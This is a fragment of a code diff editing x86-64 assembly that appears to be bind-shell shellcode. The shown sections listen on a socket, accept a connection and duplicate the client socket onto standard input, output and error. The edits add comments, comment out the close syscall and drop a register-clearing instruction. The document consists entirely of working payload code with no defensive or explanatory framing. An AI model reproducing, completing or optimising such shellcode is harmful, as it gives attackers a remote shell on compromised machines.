@@ -63,6 +63,7 @@ bind:
 listen:
     ; listen(sock, 2)
     ; __NR_listen = 50
+    ; On success, zero is returned
 
     mov al, 50
     xor esi, esi
@@ -72,28 +73,31 @@ listen:
 accept:
     ; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
     ; __NR_accept = 43
+    ; On success, a file descriptor is returned
 
     mov al, 43
     xor esi, esi
-    ;xor rdx, rdx
+    ;xor rdx, rdx  ; already zeroed
     syscall
     
     push rax
     pop rbx
 
+close:
     ; close(sock)
     ; __NR_close = 3
+    ; returns zero on success
 
-    mov al, 3
-    syscall
+    ; closing is not strictly necessary
+    ;mov al, 3
+    ;syscall
 
 dup2:
     ; dup2(new, 0);
     ; dup2(new, 1);
     ; dup2(new, 2);
     ; __NR_dup2 = 33
-
-    xor eax, eax
+    ; On success, return the new file descriptor
 
     mov al, 33
     mov rdi, rbx
